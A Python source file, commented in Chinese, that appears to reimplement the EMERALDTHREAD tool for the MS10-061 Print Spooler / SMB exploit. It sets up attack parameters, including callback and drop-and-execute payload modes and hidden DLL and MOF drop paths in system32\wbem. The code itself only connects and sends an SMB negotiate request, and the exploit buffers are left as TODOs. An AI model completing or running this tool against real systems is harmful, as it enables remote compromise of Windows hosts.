"""emerald_thread — EMERALDTHREAD (MS10-061) Print SMB 利用核心逻辑。

Python 重写的 `Emeraldthread-3.0.0.exe` (C++ / DAVE framework)。
通过 IDA Pro / x32dbg 逆向恢复。实现了该工具的 key=value 参数接口
及其 Print SMB/MS10-061 利用流程。

参数定义来源：Emeraldthread-3.0.0.0.xml
"""

import socket
import struct
import sys

# ---------------------------------------------------------------------------
# 常量（来自 XML config 的 <inputparameters>）
# ---------------------------------------------------------------------------

DEFAULT_PORT = 445
DEFAULT_TIMEOUT = 60
DEFAULT_LISTEN_WAIT = 10

PROTOCOL_VALUES = {
    "SMB": 0,
    "NBT": 1,
}

CREDENTIALS_VALUES = {
    "Anonymous":    0,
    "Guest":        1,
    "No password":  2,
    "Password":     3,
    "NTLM hash":    4,
    "Both hashes":  5,
}

PAYLOAD_TYPE_VALUES = {
    "Callback":        0,
    "Callin":          1,
    "DropAndExecute":  2,
}

PAYLOAD_SOURCE_VALUES = {
    "File":  0,
    "Inline": 1,
}

DEFAULT_REMOTE_DLL_PATH = r"\windows\system32\wbem\wbemess2.tlb"
DEFAULT_REMOTE_MOF_PATH = r"\windows\system32\wbem\.\mof\nnetcfg.mof"
DEFAULT_REMOTE_MOF_TRIGGER_PATH = r"\windows\system32\wbem\.\mof\evntprv.mof"
DEFAULT_UNCONFIGURED_DLL = "esud.dll"
DEFAULT_CONFIGURED_MOF = "nnetcfg.mof"


class EmeraldThreadError(Exception):
    pass


def _parse_hex_buffer(value):
    """将十六进制字符串解析为字节串。空字符串返回 b""。"""
    if not value:
        return b""
    value = value.strip()
    if len(value) % 2 != 0:
        raise EmeraldThreadError(f"十六进制缓冲区长度必须为偶数: {value!r}")
    try:
        return bytes.fromhex(value)
    except ValueError as exc:
        raise EmeraldThreadError(f"无效的十六进制缓冲区: {value!r}") from exc


def connect(target_ip, port, timeout):
    """建立到目标的 TCP 连接并返回 socket。"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout if timeout > 0 else None)
    sock.connect((target_ip, port))
    return sock


def build_smb_negotiate_request():
    """构建 SMB 协商请求（SMB_COM_NEGOTIATE）。"""
    command = 0x72  # SMB_COM_NEGOTIATE
    dialects = b"\x02LANMAN2.1\x00\x02NT LM 0.12\x00"
    smb = (
        b"\xffSMB"
        + struct.pack("B", command)
        + b"\x00" * 4                      # Status (NTSTATUS)
        + b"\x08"                          # Flags1: case insensitive
        + b"\x00" * 2                      # Flags2
        + b"\x00" * 2                      # PID high
        + b"\x00" * 8                      # Security features + reserved
        + b"\x00" * 8                      # TID, PID, UID, MID
        + b"\x00"                          # Word count
        + struct.pack("<H", len(dialects)) # Byte count
        + dialects
    )
    return smb


def run_function(
    target,
    port=DEFAULT_PORT,
    timeout=DEFAULT_TIMEOUT,
    protocol="SMB",
    credentials="Anonymous",
    username=None,
    password=None,
    ntlm_hash=None,
    lanman_hash=None,
    payload_type="Callback",
    callback_ip=None,
    callback_port=None,
    callback_local_port=None,
    listen_port=None,
    listen_local_port=None,
    listen_wait=DEFAULT_LISTEN_WAIT,
    payload_source="File",
    dll_buffer=None,
    mof_buffer=None,
    unconfigured_dll=None,
    configured_mof=None,
    remote_dll_path=None,
    remote_mof_path=None,
    remote_mof_trigger_path=None,
    printer_name=None,
    verbose=False,
):
    """执行 EMERALDTHREAD 利用序列。

    当前阶段：完成参数解析、SMB/NBT 连接与协商。
    具体 exploit 缓冲区（DLL/MOF 文件写入、打印服务溢出、后门投递
    等）的二进制结构尚需通过 capstone/x32dbg 进一步逆向后填充。
    """
    if verbose:
        print(f"[*] Target: {target}:{port}")
        print(f"[*] Protocol: {protocol}")
        print(f"[*] Timeout: {timeout}s")
        print(f"[*] Credentials: {credentials}")
        print(f"[*] Payload type: {payload_type}")
        print(f"[*] Payload source: {payload_source}")

    # 解析常量
    protocol_value = PROTOCOL_VALUES[protocol]
    credentials_value = CREDENTIALS_VALUES[credentials]
    payload_type_value = PAYLOAD_TYPE_VALUES[payload_type]
    payload_source_value = PAYLOAD_SOURCE_VALUES[payload_source]

    # 解析十六进制缓冲区
    dll_buffer_bytes = _parse_hex_buffer(dll_buffer)
    mof_buffer_bytes = _parse_hex_buffer(mof_buffer)

    # 默认路径
    remote_dll_path = remote_dll_path or DEFAULT_REMOTE_DLL_PATH
    remote_mof_path = remote_mof_path or DEFAULT_REMOTE_MOF_PATH
    remote_mof_trigger_path = remote_mof_trigger_path or DEFAULT_REMOTE_MOF_TRIGGER_PATH
    unconfigured_dll = unconfigured_dll or DEFAULT_UNCONFIGURED_DLL
    configured_mof = configured_mof or DEFAULT_CONFIGURED_MOF

    if verbose:
        print(f"[*] Protocol value: {protocol_value}")
        print(f"[*] Credentials value: {credentials_value}")
        print(f"[*] Payload type value: {payload_type_value}")
        print(f"[*] Payload source value: {payload_source_value}")
        print(f"[*] Remote DLL path: {remote_dll_path}")
        print(f"[*] Remote MOF path: {remote_mof_path}")
        print(f"[*] Remote MOF trigger path: {remote_mof_trigger_path}")
        print(f"[*] DLL buffer: {len(dll_buffer_bytes)} bytes")
        print(f"[*] MOF buffer: {len(mof_buffer_bytes)} bytes")

    # 建立 TCP 连接（SMB 445 / NBT 139）
    try:
        sock = connect(target, port, timeout)
        if verbose:
            print(f"[+] Connected to {target}:{port}")
    except OSError as exc:
        raise EmeraldThreadError(f"无法连接到 {target}:{port}: {exc}") from exc

    # 发送 SMB 协商请求（探测阶段）
    negotiate = build_smb_negotiate_request()
    try:
        sock.sendall(negotiate)
        resp = sock.recv(4096)
    except OSError as exc:
        sock.close()
        raise EmeraldThreadError(f"SMB 协商失败: {exc}") from exc

    if verbose:
        print(f"[*] SMB 协商应答: {resp.hex()[:128]}...")

    sock.close()

    # TODO: 以下 exploit 缓冲区构建需通过 IDA/x32dbg 逆向后填充：
    #   - Print SMB 溢出缓冲（PrinterName 相关）
    #   - DLL/MOF 文件写入（UnconfiguredDLL, ConfiguredMOF, 或 Inline 缓冲区）
    #   - 远程文件路径（RemoteDLLPath, RemoteMOFPath, RemoteMOFTriggerPath）
    #   - Payload 投递：Callback / Callin / DropAndExecute
    #   - 回连/监听端口（CallbackIp/Port, ListenPort/ListenLocalPort）

    return 0


def main(argv=None):
    """CLI 入口（供 __main__ 子命令调用）。"""
    return 0
